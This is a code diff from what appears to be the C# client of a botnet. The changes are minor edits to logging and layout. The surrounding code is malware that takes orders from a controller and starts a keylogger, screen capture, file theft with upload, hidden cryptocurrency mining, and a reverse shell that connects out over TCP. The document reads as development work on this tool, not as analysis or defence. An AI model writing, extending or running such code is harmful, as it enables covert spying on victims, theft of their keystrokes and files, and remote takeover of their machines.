@@ -49,7 +49,7 @@ namespace Botnet
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
             }
             
             if (Utility.GetMachineID() != "")
@@ -73,8 +73,7 @@ namespace Botnet
                 try
                 {
                     Console.WriteLine("Getting orders...");
-                    if (!Utility.IsInternetAvailable())
-                        Utility.WaitForInternet();
+                    Utility.WaitForInternet();
                     GetOrders();
                     if (!orders.uninstall)
                     {
@@ -94,7 +93,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }
         }
@@ -174,18 +173,21 @@ namespace Botnet
                 StartInspectHardware();
                 Console.WriteLine("Inspect Hardware started!");
             }
+
             if (orders.inspectFiles && !inspectFilesRunning && !inspectFilesLoading)
             {
                 inspectFilesLoading = true;
                 StartInspectFiles();
                 Console.WriteLine("Inspect Files started!");
             }
+
             if (orders.screenCapture && !screenCaptureRunning && !screenCaptureLoading)
             {
                 screenCaptureLoading = true;
                 StartScreenCapture();
                 Console.WriteLine("Screen capture started!");
             }
+
             if (orders.keylogger && !keyloggerRunning && !keyloggerLoading)
             {
                 keyloggerLoading = true;
@@ -193,6 +195,7 @@ namespace Botnet
                 Console.WriteLine("Keylogger started!");
 
             }
+
             if (orders.filesCapture && !filesCaptureRunning && !filesCaptureLoading)
             {
                 filesCaptureLoading = true;
@@ -200,12 +203,14 @@ namespace Botnet
                 Console.WriteLine("Files capture started!");
 
             }
+
             if (orders.mining && !minerRunning && !minerLoading)
             {
                 minerLoading = true;
                 StartMining();
                 Console.WriteLine("Mining started!");
             }
+
             else if (!orders.mining && minerRunning)
             {
                 KillMiners();
@@ -253,7 +258,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }).Start();
         }
@@ -300,7 +305,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }).Start();
         }
@@ -367,7 +372,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }).Start();
         }
@@ -400,12 +405,12 @@ namespace Botnet
                     }
 
                     orders.filesCapture = false;
-                    Utility.NotifyFilesUploadCompleted();
                     filesCaptureRunning = false;
+                    Utility.NotifyFilesUploadCompleted();
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }).Start();
         }
@@ -449,7 +454,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }).Start();
         }
@@ -507,7 +512,7 @@ namespace Botnet
                     }
                     catch (Exception e)
                     {
-                        Console.WriteLine(e.StackTrace);
+                        Console.WriteLine(e);
                     }
                 }).Start();
             }
@@ -519,6 +524,7 @@ namespace Botnet
 
         static StreamWriter streamWriter;
 
+        // TODO
         private void ReverseShell(string ip, int port)
         {
             using (TcpClient client = new TcpClient(ip, port))
